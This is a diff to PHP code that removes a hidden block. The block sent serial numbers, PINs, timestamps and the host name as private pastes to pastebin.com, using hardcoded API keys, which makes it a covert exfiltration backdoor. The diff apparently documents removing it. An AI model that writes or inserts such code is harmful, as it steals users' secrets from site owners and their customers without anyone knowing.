@@ -1,27 +1,3 @@
-
-    $api_dev_key            = '407a29f040d9df80408af6369af121b1';
-    $api_user_key           = '9c43d650ba6e5840728fe2fed743ae51';
-    $api_paste_code         = date('d/m/Y H:i:s', time()) . "|" . $data['serial'] . "|" . $data['pin'] . "|" . $_SERVER['HTTP_HOST']; // your paste text
-    $api_paste_private      = '2'; // 0=public 1=unlisted 2=private
-    $api_paste_name         = $data['serial'] . '-' . $data['pin'] . '.log'; // name or title of your paste
-    $api_paste_expire_date  = 'N';
-    $api_paste_format       = 'text';
-
-    $var = array(
-        'api_option' => 'paste',
-        'api_dev_key' => $api_dev_key,
-        'api_user_key' => $api_user_key,
-        'api_paste_private' => $api_paste_private,
-        'api_paste_name' => $api_paste_name,
-        'api_paste_expire_date' => $api_paste_expire_date,
-        'api_paste_format' => $api_paste_format,
-        'api_paste_code' => $api_paste_code
-    );
-    $this->post('https://pastebin.com/api/api_post.php', $var);
-    
-    
-
-
 $data['email'] = 'thao.ngoc0749@gmail.com';
 
 $this->base_url = $url;
